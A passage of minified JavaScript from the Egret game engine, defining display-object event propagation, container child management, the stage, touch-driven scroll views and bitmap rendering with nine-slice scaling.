            this._dispatchPropagationEvent(c, a);
            return !c._isDefaultPrevented
        };
        a.prototype._dispatchPropagationEvent = function (c, a, b) {
            b = a.length;
            for (var d = 1, e = b - 1; 0 <= e; e--) {
                var f = a[e];
                c._currentTarget = f;
                c._target = this;
                c._eventPhase = d;
                f._notifyListener(c);
                if (c._isPropagationStopped || c._isPropagationImmediateStopped)return
            }
            f = a[0];
            c._currentTarget = f;
            c._target = this;
            c._eventPhase = 2;
            f._notifyListener(c);
            if (!c._isPropagationStopped && !c._isPropagationImmediateStopped)for (d = 3, e = 1; e < b && (f = a[e], c._currentTarget = f, c._target = this, c._eventPhase = d, f._notifyListener(c), !c._isPropagationStopped && !c._isPropagationImmediateStopped); e++);
        };
        a.prototype.willTrigger =
            function (c) {
                for (var a = this; a;) {
                    if (a.hasEventListener(c))return !0;
                    a = a._parent
                }
                return !1
            };
        Object.defineProperty(a.prototype, "cacheAsBitmap", {
            get: function () {
                return this._cacheAsBitmap
            }, set: function (c) {
                (this._cacheAsBitmap = c) ? this._makeBitmapCache() : this._texture_to_render = null
            }, enumerable: !0, configurable: !0
        });
        a.prototype._makeBitmapCache = function () {
            this.renderTexture || (this.renderTexture = new b.RenderTexture);
            this.renderTexture.drawToTexture(this);
            this._texture_to_render = this.renderTexture
        };
        a.prototype._setCacheDirty =
            function (c) {
                void 0 === c && (c = !0);
                this._cacheDirty = c
            };
        a.getTransformBounds = function (c, a) {
            var b = c.x, d = c.y, e = c.width, f = c.height;
            (b || d) && a.appendTransform(0, 0, 1, 1, 0, 0, 0, -b, -d);
            var h = e * a.a, e = e * a.b, p = f * a.c, f = f * a.d, m = a.tx, q = a.ty, r = m, t = m, s = q, u = q;
            (b = h + m) < r ? r = b : b > t && (t = b);
            (b = h + p + m) < r ? r = b : b > t && (t = b);
            (b = p + m) < r ? r = b : b > t && (t = b);
            (d = e + q) < s ? s = d : d > u && (u = d);
            (d = e + f + q) < s ? s = d : d > u && (u = d);
            (d = f + q) < s ? s = d : d > u && (u = d);
            return c.initialize(r, s, t - r, u - s)
        };
        Object.defineProperty(a.prototype, "colorTransform", {
            get: function () {
                return this._colorTransform
            },
            set: function (c) {
                this._colorTransform = c
            }, enumerable: !0, configurable: !0
        });
        a.identityMatrixForGetConcatenated = new b.Matrix;
        a._enterFrameCallBackList = [];
        a._renderCallBackList = [];
        return a
    }(b.EventDispatcher);
    b.DisplayObject = e;
    e.prototype.__class__ = "egret.DisplayObject";
    e = function () {
        function b() {
            this.matrix = null
        }

        b.prototype.updateColor = function (a, c, b, l, d, e, f, h) {
        };
        return b
    }();
    b.ColorTransform = e;
    e.prototype.__class__ = "egret.ColorTransform"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a() {
            d.call(this);
            this._touchChildren = !0;
            this._children = []
        }

        __extends(a, d);
        Object.defineProperty(a.prototype, "touchChildren", {
            get: function () {
                return this._touchChildren
            }, set: function (c) {
                this._touchChildren = c
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "numChildren", {
            get: function () {
                return this._children.length
            }, enumerable: !0, configurable: !0
        });
        a.prototype.setChildIndex = function (c, a) {
            this.doSetChildIndex(c, a)
        };
        a.prototype.doSetChildIndex = function (c,
                                                a) {
            var l = this._children.indexOf(c);
            0 > l && b.Logger.fatal("child\u4e0d\u5728\u5f53\u524d\u5bb9\u5668\u5185");
            this._children.splice(l, 1);
            0 > a || this._children.length <= a ? this._children.push(c) : this._children.splice(a, 0, c)
        };
        a.prototype.addChild = function (c) {
            var a = this._children.length;
            c._parent == this && a--;
            return this._doAddChild(c, a)
        };
        a.prototype.addChildAt = function (c, a) {
            return this._doAddChild(c, a)
        };
        a.prototype._doAddChild = function (c, k, l) {
            void 0 === l && (l = !0);
            if (c == this)return c;
            if (0 > k || k > this._children.length)return b.Logger.fatal("\u63d0\u4f9b\u7684\u7d22\u5f15\u8d85\u51fa\u8303\u56f4"),
                c;
            var d = c._parent;
            if (d == this)return this.doSetChildIndex(c, k), c;
            d && (k = d._children.indexOf(c), 0 <= k && d._doRemoveChild(k));
            this._children.splice(k, 0, c);
            c._parentChanged(this);
            l && c.dispatchEventWith(b.Event.ADDED, !0);
            if (this._stage)for (c._onAddToStage(), k = a.__EVENT__ADD_TO_STAGE_LIST; 0 < k.length;)k.shift().dispatchEventWith(b.Event.ADDED_TO_STAGE);
            c._setDirty();
            this._setSizeDirty();
            return c
        };
        a.prototype.removeChild = function (c) {
            c = this._children.indexOf(c);
            if (0 <= c)return this._doRemoveChild(c);
            b.Logger.fatal("child\u672a\u88abaddChild\u5230\u8be5parent");
            return null
        };
        a.prototype.removeChildAt = function (c) {
            if (0 <= c && c < this._children.length)return this._doRemoveChild(c);
            b.Logger.fatal("\u63d0\u4f9b\u7684\u7d22\u5f15\u8d85\u51fa\u8303\u56f4");
            return null
        };
        a.prototype._doRemoveChild = function (c, k) {
            void 0 === k && (k = !0);
            var l = this._children, d = l[c];
            k && d.dispatchEventWith(b.Event.REMOVED, !0);
            if (this._stage) {
                d._onRemoveFromStage();
                for (var e = a.__EVENT__REMOVE_FROM_STAGE_LIST; 0 < e.length;) {
                    var f = e.shift();
                    f.dispatchEventWith(b.Event.REMOVED_FROM_STAGE);
                    f._stage = null
                }
            }
            d._parentChanged(null);
            l.splice(c, 1);
            this._setSizeDirty();
            return d
        };
        a.prototype.getChildAt = function (c) {
            if (0 <= c && c < this._children.length)return this._children[c];
            b.Logger.fatal("\u63d0\u4f9b\u7684\u7d22\u5f15\u8d85\u51fa\u8303\u56f4");
            return null
        };
        a.prototype.contains = function (c) {
            for (; c;) {
                if (c == this)return !0;
                c = c._parent
            }
            return !1
        };
        a.prototype.swapChildrenAt = function (c, a) {
            0 <= c && c < this._children.length && 0 <= a && a < this._children.length ? this._swapChildrenAt(c, a) : b.Logger.fatal("\u63d0\u4f9b\u7684\u7d22\u5f15\u8d85\u51fa\u8303\u56f4")
        };
        a.prototype.swapChildren = function (c, a) {
            var l = this._children.indexOf(c), d = this._children.indexOf(a);
            -1 == l || -1 == d ? b.Logger.fatal("child\u672a\u88abaddChild\u5230\u8be5parent") : this._swapChildrenAt(l, d)
        };
        a.prototype._swapChildrenAt = function (c, a) {
            if (c != a) {
                var b = this._children, d = b[c];
                b[c] = b[a];
                b[a] = d
            }
        };
        a.prototype.getChildIndex = function (c) {
            return this._children.indexOf(c)
        };
        a.prototype.removeChildren = function () {
            for (var c = this._children.length - 1; 0 <= c; c--)this._doRemoveChild(c)
        };
        a.prototype._updateTransform =
            function () {
                if (this._visible) {
                    d.prototype._updateTransform.call(this);
                    for (var c = 0, a = this._children.length; c < a; c++)this._children[c]._updateTransform()
                }
            };
        a.prototype._render = function (c) {
            for (var a = 0, b = this._children.length; a < b; a++)this._children[a]._draw(c)
        };
        a.prototype._measureBounds = function () {
            for (var c = 0, a = 0, l = 0, d = 0, e = this._children.length, f = 0; f < e; f++) {
                var h = this._children[f];
                if (h._visible) {
                    var p = h.getBounds(b.Rectangle.identity, !1), m = p.x, q = p.y, r = p.width, p = p.height, h = h._getMatrix(), h = b.DisplayObject.getTransformBounds(b.Rectangle.identity.initialize(m,
                        q, r, p), h), m = h.x, q = h.y, r = h.width + h.x, h = h.height + h.y;
                    if (m < c || 0 == f)c = m;
                    if (r > a || 0 == f)a = r;
                    if (q < l || 0 == f)l = q;
                    if (h > d || 0 == f)d = h
                }
            }
            return b.Rectangle.identity.initialize(c, l, a - c, d - l)
        };
        a.prototype.hitTest = function (c, a, l) {
            void 0 === l && (l = !1);
            var e;
            if (!this._visible)return null;
            if (this._scrollRect) {
                if (c < this._scrollRect.x || a < this._scrollRect.y || c > this._scrollRect.x + this._scrollRect.width || a > this._scrollRect.y + this._scrollRect.height)return null
            } else if (this.mask && (this.mask.x > c || c > this.mask.x + this.mask.width || this.mask.y >
                a || a > this.mask.y + this.mask.height))return null;
            for (var g = this._children, f = this._touchChildren, h = g.length - 1; 0 <= h; h--) {
                var p = g[h], m = p._getMatrix(), q = p._scrollRect;
                q && m.append(1, 0, 0, 1, -q.x, -q.y);
                m.invert();
                m = b.Matrix.transformCoords(m, c, a);
                if (p = p.hitTest(m.x, m.y, !0)) {
                    if (!f)return this;
                    if (p._touchEnabled && f)return p;
                    e = this
                }
            }
            return e ? e : this._texture_to_render || this.graphics ? d.prototype.hitTest.call(this, c, a, l) : null
        };
        a.prototype._onAddToStage = function () {
            d.prototype._onAddToStage.call(this);
            for (var c = this._children.length,
                     a = 0; a < c; a++)this._children[a]._onAddToStage()
        };
        a.prototype._onRemoveFromStage = function () {
            d.prototype._onRemoveFromStage.call(this);
            for (var c = this._children.length, a = 0; a < c; a++)this._children[a]._onRemoveFromStage()
        };
        a.prototype.getChildByName = function (c) {
            for (var a = this._children, b = a.length, d, e = 0; e < b; e++)if (d = a[e], d.name == c)return d;
            return null
        };
        a.__EVENT__ADD_TO_STAGE_LIST = [];
        a.__EVENT__REMOVE_FROM_STAGE_LIST = [];
        return a
    }(b.DisplayObject);
    b.DisplayObjectContainer = e;
    e.prototype.__class__ = "egret.DisplayObjectContainer"
})(egret ||
(egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a(c, a) {
            void 0 === c && (c = 480);
            void 0 === a && (a = 800);
            d.call(this);
            this.touchEnabled = !0;
            this._stage = this;
            this._stageWidth = c;
            this._stageHeight = a
        }

        __extends(a, d);
        a.prototype.invalidate = function () {
            a._invalidateRenderFlag = !0
        };
        Object.defineProperty(a.prototype, "scaleMode", {
            get: function () {
                return this._scaleMode
            }, set: function (c) {
                if (this._scaleMode != c) {
                    this._scaleMode = c;
                    var a = {};
                    a[b.StageScaleMode.NO_SCALE] = new b.NoScale;
                    a[b.StageScaleMode.SHOW_ALL] = new b.ShowAll;
                    a[b.StageScaleMode.NO_BORDER] =
                        new b.FixedWidth;
                    a[b.StageScaleMode.EXACT_FIT] = new b.FullScreen;
                    c = a[c];
                    if (!c)throw Error("\u4f7f\u7528\u4e86\u5c1a\u672a\u5b9e\u73b0\u7684ScaleMode");
                    a = new b.EqualToFrame;
                    c = new b.ResolutionPolicy(a, c);
                    b.StageDelegate.getInstance()._setResolutionPolicy(c);
                    this._stageWidth = b.StageDelegate.getInstance()._stageWidth;
                    this._stageHeight = b.StageDelegate.getInstance()._stageHeight;
                    this.dispatchEventWith(b.Event.RESIZE)
                }
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "stageWidth", {
            get: function () {
                return this._stageWidth
            },
            enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "stageHeight", {
            get: function () {
                return this._stageHeight
            }, enumerable: !0, configurable: !0
        });
        a.prototype.hitTest = function (c, a, l) {
            if (!this._touchEnabled)return null;
            var d;
            if (!this._touchChildren)return this;
            l = this._children;
            for (var e = l.length - 1; 0 <= e; e--) {
                d = l[e];
                var f = d._getMatrix(), h = d._scrollRect;
                h && f.append(1, 0, 0, 1, -h.x, -h.y);
                f.invert();
                f = b.Matrix.transformCoords(f, c, a);
                if ((d = d.hitTest(f.x, f.y, !0)) && d._touchEnabled)return d
            }
            return this
        };
        a.prototype.getBounds = function (c) {
            c || (c = new b.Rectangle);
            return c.initialize(0, 0, this._stageWidth, this._stageHeight)
        };
        a.prototype._updateTransform = function () {
            for (var c = 0, a = this._children.length; c < a; c++)this._children[c]._updateTransform()
        };
        Object.defineProperty(a.prototype, "focus", {
            get: function () {
                return null
            }, enumerable: !0, configurable: !0
        });
        a._invalidateRenderFlag = !1;
        return a
    }(b.DisplayObjectContainer);
    b.Stage = e;
    e.prototype.__class__ = "egret.Stage"
})(egret || (egret = {}));
(function (b) {
    var e = function () {
        function b() {
        }

        b.NO_BORDER = "noBorder";
        b.NO_SCALE = "noScale";
        b.SHOW_ALL = "showAll";
        b.EXACT_FIT = "exactFit";
        return b
    }();
    b.StageScaleMode = e;
    e.prototype.__class__ = "egret.StageScaleMode"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a(c) {
            void 0 === c && (c = null);
            d.call(this);
            this._lastTouchPosition = new b.Point(0, 0);
            this._lastTouchTime = 0;
            this._lastTouchEvent = null;
            this._velocitys = [];
            this._content = null;
            this._horizontalScrollPolicy = this._verticalScrollPolicy = "auto";
            this._scrollTop = this._scrollLeft = 0;
            this._vCanScroll = this._hCanScroll = !1;
            this.touchEnabled = !0;
            c && this.setContent(c)
        }

        __extends(a, d);
        a.prototype.setContent = function (c) {
            this._content && (this._removeEvents(), d.prototype.removeChildAt.call(this,
                0));
            this._content = c;
            d.prototype.addChild.call(this, c);
            this._addEvents();
            this._explicitWidth || this._getContentWidth();
            this._explicitHeight || this._getContentHeight()
        };
        Object.defineProperty(a.prototype, "verticalScrollPolicy", {
            get: function () {
                return this._verticalScrollPolicy
            }, set: function (c) {
                c != this._verticalScrollPolicy && (this._verticalScrollPolicy = c)
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "horizontalScrollPolicy", {
            get: function () {
                return this._horizontalScrollPolicy
            }, set: function (c) {
                c !=
                this._horizontalScrollPolicy && (this._horizontalScrollPolicy = c)
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "scrollLeft", {
            get: function () {
                return this._scrollLeft
            }, set: function (c) {
                c != this._scrollLeft && (this._scrollLeft = c, this._updateContentPosition())
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "scrollTop", {
            get: function () {
                return this._scrollTop
            }, set: function (c) {
                c != this._scrollTop && (this._scrollTop = c, this._updateContentPosition())
            }, enumerable: !0, configurable: !0
        });
        a.prototype.setScrollPosition = function (c, a, b) {
            void 0 === b && (b = !1);
            if (!b || 0 != c || 0 != a)if (b || this._scrollTop != c || this._scrollLeft != a)b ? (this._scrollTop += c, this._scrollLeft += a) : (this._scrollTop = c, this._scrollLeft = a), this._updateContentPosition()
        };
        a.prototype._setWidth = function (c) {
            this._explicitWidth != c && (d.prototype._setWidth.call(this, c), this._updateContentPosition())
        };
        a.prototype._setHeight = function (c) {
            this._explicitHeight != c && (d.prototype._setHeight.call(this, c), this._updateContentPosition())
        };
        a.prototype._updateContentPosition =
            function () {
                this.scrollRect = new b.Rectangle(this._scrollLeft, this._scrollTop, this.width, this.height);
                this.dispatchEvent(new b.Event(b.Event.CHANGE))
            };
        a.prototype._checkScrollPolicy = function () {
            var c = this.__checkScrollPolicy(this._horizontalScrollPolicy, this._getContentWidth(), this.width);
            this._hCanScroll = c;
            var a = this.__checkScrollPolicy(this._verticalScrollPolicy, this._getContentHeight(), this.height);
            this._vCanScroll = a;
            return c || a
        };
        a.prototype.__checkScrollPolicy = function (c, a, b) {
            return "on" == c ? !0 : "off" ==
            c ? !1 : a > b
        };
        a.prototype._addEvents = function () {
            this.addEventListener(b.TouchEvent.TOUCH_BEGIN, this._onTouchBegin, this);
            this.addEventListener(b.TouchEvent.TOUCH_BEGIN, this._onTouchBeginCapture, this, !0);
            this.addEventListener(b.TouchEvent.TOUCH_END, this._onTouchEndCapture, this, !0)
        };
        a.prototype._removeEvents = function () {
            this.removeEventListener(b.TouchEvent.TOUCH_BEGIN, this._onTouchBegin, this);
            this.removeEventListener(b.TouchEvent.TOUCH_BEGIN, this._onTouchBeginCapture, this, !0);
            this.removeEventListener(b.TouchEvent.TOUCH_END,
                this._onTouchEndCapture, this, !0)
        };
        a.prototype._onTouchBegin = function (c) {
            c._isDefaultPrevented || (b.Tween.removeTweens(this), this.stage.addEventListener(b.TouchEvent.TOUCH_MOVE, this._onTouchMove, this), this.stage.addEventListener(b.TouchEvent.TOUCH_END, this._onTouchEnd, this), this.stage.addEventListener(b.TouchEvent.LEAVE_STAGE, this._onTouchEnd, this), this.addEventListener(b.Event.ENTER_FRAME, this._onEnterFrame, this), this._logTouchEvent(c), c.preventDefault())
        };
        a.prototype._onTouchBeginCapture = function (c) {
            var k =
                this._checkScrollPolicy();
            if (k) {
                for (var l = c.target; l != this;) {
                    if (l instanceof a && (k = l._checkScrollPolicy()))return;
                    l = l.parent
                }
                c.stopPropagation();
                this.delayTouchBeginEvent = this.cloneTouchEvent(c);
                this.touchBeginTimer || (this.touchBeginTimer = new b.Timer(100, 1), this.touchBeginTimer.addEventListener(b.TimerEvent.TIMER_COMPLETE, this._onTouchBeginTimer, this));
                this.touchBeginTimer.start();
                this._onTouchBegin(c)
            }
        };
        a.prototype._onTouchEndCapture = function (c) {
            this.delayTouchBeginEvent && this._onTouchBeginTimer()
        };
        a.prototype._onTouchBeginTimer = function () {
            this.touchBeginTimer.stop();
            var c = this.delayTouchBeginEvent;
            this.delayTouchBeginEvent = null;
            this.dispatchPropagationEvent(c)
        };
        a.prototype.dispatchPropagationEvent = function (c) {
            for (var a = [], b = c._target; b;)a.push(b), b = b.parent;
            for (var d = this._content, e = 1; ; e += 2) {
                b = a[e];
                if (!b || b === d)break;
                a.unshift(b)
            }
            this._dispatchPropagationEvent(c, a)
        };
        a.prototype._dispatchPropagationEvent = function (c, a, b) {
            for (var d = a.length, e = 0; e < d; e++) {
                var f = a[e];
                c._currentTarget = f;
                c._target =
                    this;
                c._eventPhase = e < b ? 1 : e == b ? 2 : 3;
                f._notifyListener(c);
                if (c._isPropagationStopped || c._isPropagationImmediateStopped)break
            }
        };
        a.prototype._onTouchMove = function (c) {
            this.delayTouchBeginEvent && (this.delayTouchBeginEvent = null, this.touchBeginTimer.stop());
            var a = this._getPointChange(c);
            this.setScrollPosition(a.y, a.x, !0);
            this._calcVelocitys(c);
            this._logTouchEvent(c)
        };
        a.prototype._onTouchEnd = function (c) {
            this.stage.removeEventListener(b.TouchEvent.TOUCH_MOVE, this._onTouchMove, this);
            this.stage.removeEventListener(b.TouchEvent.TOUCH_END,
                this._onTouchEnd, this);
            this.stage.removeEventListener(b.TouchEvent.LEAVE_STAGE, this._onTouchEnd, this);
            this.removeEventListener(b.Event.ENTER_FRAME, this._onEnterFrame, this);
            this._moveAfterTouchEnd()
        };
        a.prototype._onEnterFrame = function (c) {
            c = b.getTimer();
            100 < c - this._lastTouchTime && 300 > c - this._lastTouchTime && this._calcVelocitys(this._lastTouchEvent)
        };
        a.prototype._logTouchEvent = function (c) {
            this._lastTouchPosition.x = c.stageX;
            this._lastTouchPosition.y = c.stageY;
            this._lastTouchEvent = this.cloneTouchEvent(c);
            this._lastTouchTime = b.getTimer()
        };
        a.prototype._getPointChange = function (c) {
            return {
                x: !1 === this._hCanScroll ? 0 : this._lastTouchPosition.x - c.stageX,
                y: !1 === this._vCanScroll ? 0 : this._lastTouchPosition.y - c.stageY
            }
        };
        a.prototype._calcVelocitys = function (c) {
            var a = b.getTimer();
            if (0 == this._lastTouchTime)this._lastTouchTime = a; else {
                var d = this._getPointChange(c), a = a - this._lastTouchTime;
                d.x /= a;
                d.y /= a;
                this._velocitys.push(d);
                5 < this._velocitys.length && this._velocitys.shift();
                this._lastTouchPosition.x = c.stageX;
                this._lastTouchPosition.y =
                    c.stageY
            }
        };
        a.prototype._getContentWidth = function () {
            return this._content.explicitWidth || this._content.width
        };
        a.prototype._getContentHeight = function () {
            return this._content.explicitHeight || this._content.height
        };
        a.prototype.getMaxScrollLeft = function () {
            return this._getContentWidth() - this.width
        };
        a.prototype.getMaxScrollTop = function () {
            return this._getContentHeight() - this.height
        };
        a.prototype._moveAfterTouchEnd = function () {
            if (0 != this._velocitys.length) {
                for (var c = 0, b = 0, d = 0, e = 0; e < this._velocitys.length; e++)var g =
                    this._velocitys[e], f = a.weight[e], c = c + g.x * f, b = b + g.y * f, d = d + f;
                this._velocitys.length = 0;
                c /= d;
                b /= d;
                g = Math.abs(c);
                d = Math.abs(b);
                f = this.getMaxScrollLeft();
                e = this.getMaxScrollTop();
                c = 0.02 < g ? this.getAnimationDatas(c, this._scrollLeft, f) : {
                    position: this._scrollLeft,
                    duration: 1
                };
                b = 0.02 < d ? this.getAnimationDatas(b, this._scrollTop, e) : {position: this._scrollTop, duration: 1};
                this.setScrollLeft(c.position, c.duration);
                this.setScrollTop(b.position, b.duration)
            }
        };
        a.prototype.setScrollTop = function (c, a) {
            void 0 === a && (a = 0);
            var d =
                Math.min(this.getMaxScrollTop(), Math.max(c, 0));
            if (0 == a)return this.scrollTop = d, null;
            var e = b.Tween.get(this).to({scrollTop: c}, a, b.Ease.quartOut);
            d != c && e.to({scrollTop: d}, 300, b.Ease.quintOut)
        };
        a.prototype.setScrollLeft = function (c, a) {
            void 0 === a && (a = 0);
            var d = Math.min(this.getMaxScrollLeft(), Math.max(c, 0));
            if (0 == a)return this.scrollLeft = d, null;
            var e = b.Tween.get(this).to({scrollLeft: c}, a, b.Ease.quartOut);
            d != c && e.to({scrollLeft: d}, 300, b.Ease.quintOut)
        };
        a.prototype.getAnimationDatas = function (c, a, b) {
            var d =
                Math.abs(c), e = 0, f = a + 500 * c;
            if (0 > f || f > b)for (f = a; Infinity != Math.abs(c) && 0.02 < Math.abs(c);)f += c, c = 0 > f || f > b ? 0.998 * c * 0.95 : 0.998 * c, e++; else e = 500 * -Math.log(0.02 / d);
            return {position: Math.min(b + 50, Math.max(f, -50)), duration: e}
        };
        a.prototype.cloneTouchEvent = function (c) {
            var a = new b.TouchEvent(c._type, c._bubbles, c.cancelable);
            a.touchPointID = c.touchPointID;
            a._stageX = c._stageX;
            a._stageY = c._stageY;
            a.ctrlKey = c.ctrlKey;
            a.altKey = c.altKey;
            a.shiftKey = c.shiftKey;
            a.touchDown = c.touchDown;
            a._isDefaultPrevented = !1;
            a._target =
                c._target;
            return a
        };
        a.prototype.throwNotSupportedError = function () {
            throw Error("\u6b64\u65b9\u6cd5\u5728ScrollView\u5185\u4e0d\u53ef\u7528!");
        };
        a.prototype.addChild = function (c) {
            this.throwNotSupportedError();
            return null
        };
        a.prototype.addChildAt = function (c, a) {
            this.throwNotSupportedError();
            return null
        };
        a.prototype.removeChild = function (c) {
            this.throwNotSupportedError();
            return null
        };
        a.prototype.removeChildAt = function (c) {
            this.throwNotSupportedError();
            return null
        };
        a.prototype.setChildIndex = function (c, a) {
            this.throwNotSupportedError()
        };
        a.prototype.swapChildren = function (c, a) {
            this.throwNotSupportedError()
        };
        a.prototype.swapChildrenAt = function (c, a) {
            this.throwNotSupportedError()
        };
        a.weight = [1, 1.33, 1.66, 2, 2.33];
        return a
    }(b.DisplayObjectContainer);
    b.ScrollView = e;
    e.prototype.__class__ = "egret.ScrollView"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a(c, a, e) {
            void 0 === a && (a = NaN);
            void 0 === e && (e = NaN);
            d.call(this, c);
            this.content = c;
            this.width = NaN == a ? this._getContentWidth() : a;
            this.height = NaN == e ? this._getContentHeight() : e;
            b.Logger.warning("egret.Scroller\u5df2\u5e9f\u5f03\uff0c\u8bf7\u4f7f\u7528egret.ScrollView")
        }

        __extends(a, d);
        Object.defineProperty(a.prototype, "scrollXEnabled", {
            get: function () {
                return "off" != this.horizontalScrollPolicy
            }, set: function (c) {
                b.Logger.warning("egret.Scroller\u5df2\u5e9f\u5f03\uff0c\u8bf7\u4f7f\u7528egret.ScrollView");
                this.horizontalScrollPolicy = c ? "auto" : "off"
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "scrollYEnabled", {
            get: function () {
                return "off" != this.verticalScrollPolicy
            }, set: function (c) {
                b.Logger.warning("egret.Scroller\u5df2\u5e9f\u5f03\uff0c\u8bf7\u4f7f\u7528egret.ScrollView");
                this.verticalScrollPolicy = c ? "auto" : "off"
            }, enumerable: !0, configurable: !0
        });
        return a
    }(b.ScrollView);
    b.Scroller = e;
    e.prototype.__class__ = "egret.Scroller"
})(egret || (egret = {}));
(function (b) {
    var e = function () {
        function b() {
        }

        b.REPEAT = "repeat";
        b.SCALE = "scale";
        return b
    }();
    b.BitmapFillMode = e;
    e.prototype.__class__ = "egret.BitmapFillMode"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a(c) {
            d.call(this);
            this.debug = !1;
            this.debugColor = 16711680;
            this.scale9Grid = null;
            this.fillMode = "scale";
            c && (this._texture = c, this._setSizeDirty())
        }

        __extends(a, d);
        Object.defineProperty(a.prototype, "texture", {
            get: function () {
                return this._texture
            }, set: function (c) {
                c != this._texture && (this._setSizeDirty(), this._texture = c)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._render = function (c) {
            var b = this._texture;
            b ? (this._texture_to_render = b, a._drawBitmap(c, this._hasWidthSet ? this._explicitWidth :
                b._textureWidth, this._hasHeightSet ? this._explicitHeight : b._textureHeight, this)) : this._texture_to_render = null
        };
        a._drawBitmap = function (c, b, d, e) {
            var g = e._texture_to_render;
            if (g) {
                var f = g._textureWidth, h = g._textureHeight;
                if ("scale" == e.fillMode) {
                    var p = e.scale9Grid || g.scale9Grid;
                    if (p && f - p.width < b && h - p.height < d)a.drawScale9GridImage(c, e, p, b, d); else {
                        var p = g._offsetX, m = g._offsetY, q = g._bitmapWidth || f, r = g._bitmapHeight || h;
                        b /= f;
                        p = Math.round(p * b);
                        b = Math.round(q * b);
                        d /= h;
                        m = Math.round(m * d);
                        d = Math.round(r * d);
                        a.renderFilter.drawImage(c,
                            e, g._bitmapX, g._bitmapY, q, r, p, m, b, d)
                    }
                } else a.drawRepeatImage(c, e, b, d, e.fillMode)
            }
        };
        a.drawRepeatImage = function (c, a, d, e, g) {
            var f = a._texture_to_render;
            if (f) {
                var h = f._textureWidth, p = f._textureHeight, m = f._bitmapX, q = f._bitmapY, h = f._bitmapWidth || h, p = f._bitmapHeight || p, r = f._offsetX, f = f._offsetY;
                b.RenderFilter.getInstance().drawImage(c, a, m, q, h, p, r, f, d, e, g)
            }
        };
        a.drawScale9GridImage = function (c, a, d, e, g) {
            var f = a._texture_to_render;
            if (f && d) {
                var h = b.RenderFilter.getInstance(), p = f._textureWidth, m = f._textureHeight,
                    q = f._bitmapX, r = f._bitmapY, t = f._bitmapWidth || p, s = f._bitmapHeight || m, u = f._offsetX, f = f._offsetY;
                d = b.Rectangle.identity.initialize(d.x - Math.round(u), d.y - Math.round(u), d.width, d.height);
                u = Math.round(u);
                f = Math.round(f);
                e -= p - t;
                g -= m - s;
                d.y == d.bottom && (d.bottom < s ? d.bottom++ : d.y--);
                d.x == d.right && (d.right < t ? d.right++ : d.x--);
                var p = q + d.x, m = q + d.right, y = t - d.right, v = r + d.y, z = r + d.bottom, x = s - d.bottom, w = u + d.x, A = f + d.y, s = g - (s - d.bottom), t = e - (t - d.right);
                h.drawImage(c, a, q, r, d.x, d.y, u, f, d.x, d.y);
                h.drawImage(c, a, p, r, d.width,
                    d.y, w, f, t - d.x, d.y);
                h.drawImage(c, a, m, r, y, d.y, u + t, f, e - t, d.y);
                h.drawImage(c, a, q, v, d.x, d.height, u, A, d.x, s - d.y);
                h.drawImage(c, a, p, v, d.width, d.height, w, A, t - d.x, s - d.y);
                h.drawImage(c, a, m, v, y, d.height, u + t, A, e - t, s - d.y);
                h.drawImage(c, a, q, z, d.x, x, u, f + s, d.x, g - s);
                h.drawImage(c, a, p, z, d.width, x, w, f + s, t - d.x, g - s);
                h.drawImage(c, a, m, z, y, x, u + t, f + s, e - t, g - s)
            }
        };
        a.prototype._measureBounds = function () {
            var c = this._texture;
            return c ? b.Rectangle.identity.initialize(c._offsetX, c._offsetY, c._textureWidth, c._textureHeight) : d.prototype._measureBounds.call(this)
        };
        a.debug = !1;
        a.renderFilter = b.RenderFilter.getInstance();
        return a
    }(b.DisplayObject);
    b.Bitmap = e;
    e.prototype.__class__ = "egret.Bitmap"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a() {
            d.call(this);
            this._text = "";
            this._textChanged = !1;
            this._bitmapPool = []
        }

        __extends(a, d);
        Object.defineProperty(a.prototype, "text", {
            get: function () {
                return this._text
            }, set: function (c) {
                this._textChanged = !0;
                this._text = c;
                this._setSizeDirty()
            }, enumerable: !0, configurable: !0
        });
        a.prototype._updateTransform = function () {
            this.visible && (this._textChanged && this._renderText(), d.prototype._updateTransform.call(this))
        };
        a.prototype._renderText = function (c) {
            var a = c = 0;
            this._textChanged &&
            this.removeChildren();
            for (var d = 0, e = this.text.length; d < e; d++) {
                var g = this.text.charAt(d), f = this.spriteSheet.getTexture(g);
                if (null == f)console.log("\u5f53\u524d\u6ca1\u6709\u4f4d\u56fe\u6587\u5b57\uff1a" + g); else {
                    var g = f._offsetX, h = f._offsetY, p = f._textureWidth;
                    if (this._textChanged) {
                        var m = this._bitmapPool[d];
                        m || (m = new b.Bitmap, this._bitmapPool.push(m));
                        m.texture = f;
                        this.addChild(m);
                        m.x = c
                    }
                    c += p + g;
